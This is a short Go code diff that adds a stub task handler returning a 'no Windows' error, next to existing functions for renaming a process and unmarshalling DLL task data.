@@ -29,6 +29,9 @@ func taskRename(_ context.Context, r data.Reader, _ data.Writer) error {
 	}
 	return device.SetProcessName(s)
 }
+func taskRegistry(_ context.Context, _ data.Reader, _ data.Writer) error {
+	return device.ErrNoWindows
+}
 
 // DLLUnmarshal will read this DLL's struct data from the supplied reader and
 // returns a DLL runnable struct along with the wait and delete status booleans.
